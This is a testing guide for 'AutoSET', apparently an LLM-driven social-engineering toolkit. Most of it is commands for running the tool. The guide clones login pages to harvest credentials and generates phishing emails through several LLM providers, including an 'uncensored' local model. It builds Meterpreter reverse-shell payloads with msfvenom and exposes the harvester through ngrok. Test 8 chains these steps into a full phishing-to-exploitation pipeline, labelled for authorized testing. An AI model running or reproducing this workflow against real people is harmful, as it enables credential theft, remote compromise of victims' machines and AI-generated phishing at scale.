# AutoSET Testing Guide

Complete pipeline testing instructions for AutoSET.

## Prerequisites

```bash
# Install system dependencies
sudo apt-get install wget metasploit-framework

# Install Python dependencies
pip install -r requirements.txt

# Install ngrok
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok
```

## Configuration

```bash
# Copy config templates
cp autoset/config/groq_keys.json.example autoset/config/groq_keys.json
cp autoset/config/cohere_keys.json.example autoset/config/cohere_keys.json
cp autoset/config/deepseek_keys.json.example autoset/config/deepseek_keys.json

# Edit with your API keys (optional - Ollama works without keys)
nano autoset/config/groq_keys.json
```

## Test 1: Automated Test Suite

```bash
# Run all automated tests
python test_autoset.py

# Expected output: 5 tests (workspace, harvester, web clone, payload list, LLM)
```

## Test 2: Workspace & Logging

```bash
# Start AutoSET
python autoset/agent.py --provider ollama

# Verify workspace created
ls -la ~/.autoset/workspaces/

# Check logs
tail -f ~/.autoset/logs/autoset_*.log
```

## Test 3: Credential Harvester

```bash
# Terminal 1: Start AutoSET
python autoset/agent.py

# In AutoSET prompt:
autoset> /harvest http://example.com

# Terminal 2: Test credential capture
curl -X POST http://localhost:8080/login \
  -d "username=testuser&password=testpass"

# Verify captured credentials
cat ~/.autoset/workspaces/session_*/harvested_creds.json
```

## Test 4: Website Cloning

```bash
# In AutoSET:
autoset> /harvest https://example.com

# Verify cloned files
ls -la ~/.autoset/workspaces/session_*/cloned_site/

# Check HTML files
find ~/.autoset/workspaces/session_*/cloned_site/ -name "*.html"
```

## Test 5: Phishing Email Generation

```bash
# In AutoSET:
autoset> /phish target@company.com "urgent password reset required"

# Review generated email
cat ~/.autoset/workspaces/session_*/phishing_email.txt

# Test with different pretexts
autoset> /phish admin@corp.com "account verification needed"
```

## Test 6: Payload Generation

```bash
# List available payloads
autoset> /list-payloads windows

# Generate Windows reverse shell
autoset> /payload windows/meterpreter/reverse_tcp 10.0.0.1

# Verify payload created
ls -lh ~/.autoset/workspaces/session_*/payload.exe

# Test Linux payload
autoset> /payload linux/x64/meterpreter/reverse_tcp 192.168.1.100

# List Android payloads
autoset> /list-payloads android
```

## Test 7: Ngrok Tunneling

```bash
# Configure ngrok (first time only)
ngrok config add-authtoken YOUR_NGROK_TOKEN

# In AutoSET:
autoset> /tunnel 8080

# Test public URL (from another machine)
curl https://YOUR-NGROK-URL.ngrok.io

# Verify tunnel status
curl http://localhost:4040/api/tunnels
```

## Test 8: Full Pipeline Integration

```bash
# Complete attack simulation (authorized testing only)

# Step 1: Clone target site
autoset> /harvest https://login.example.com

# Step 2: Start public tunnel
autoset> /tunnel 8080

# Step 3: Generate phishing email with tunnel URL
autoset> /phish victim@target.com "password reset - click link"

# Step 4: Monitor captured credentials
watch -n 2 cat ~/.autoset/workspaces/session_*/harvested_creds.json

# Step 5: Generate payload for post-exploitation
autoset> /payload windows/meterpreter/reverse_tcp YOUR_IP
```

## Test 9: Multi-LLM Provider Testing

```bash
# Test Ollama (default)
python autoset/agent.py --provider ollama
autoset> /phish test@test.com "test pretext"

# Test Groq
python autoset/agent.py --provider groq
autoset> /phish test@test.com "test pretext"

# Test Cohere
python autoset/agent.py --provider cohere
autoset> /phish test@test.com "test pretext"

# Test DeepSeek
python autoset/agent.py --provider deepseek
autoset> /phish test@test.com "test pretext"
```

## Test 10: Debug Mode

```bash
# Enable debug logging
python autoset/agent.py --debug

# Monitor detailed logs
tail -f ~/.autoset/logs/autoset_*.log

# Test error handling
autoset> /harvest invalid-url
autoset> /payload invalid/payload/type 0.0.0.0
```

## Verification Checklist

- [ ] Workspace created in `~/.autoset/workspaces/`
- [ ] Logs generated in `~/.autoset/logs/`
- [ ] Harvester captures POST data
- [ ] Website cloned successfully
- [ ] Phishing emails generated
- [ ] Payloads created with msfvenom
- [ ] Ngrok tunnel established
- [ ] LLM provider responds
- [ ] All commands execute without errors

## Cleanup

```bash
# Remove test workspaces
rm -rf ~/.autoset/workspaces/session_*

# Remove test logs
rm -f ~/.autoset/logs/autoset_*.log

# Stop any running harvesters
pkill -f "flask"

# Stop ngrok tunnels
pkill -f "ngrok"
```

## Troubleshooting

**Harvester not starting:**
```bash
# Check port availability
netstat -tuln | grep 8080
# Kill conflicting process
sudo fuser -k 8080/tcp
```

**Payload generation fails:**
```bash
# Verify msfvenom installed
which msfvenom
msfvenom --list payloads | head
```

**LLM not responding:**
```bash
# Test Ollama directly
ollama list
ollama run wizard-vicuna-uncensored:7b "test"
```

**Ngrok fails:**
```bash
# Check ngrok auth
ngrok config check
# Test manual tunnel
ngrok http 8080
```
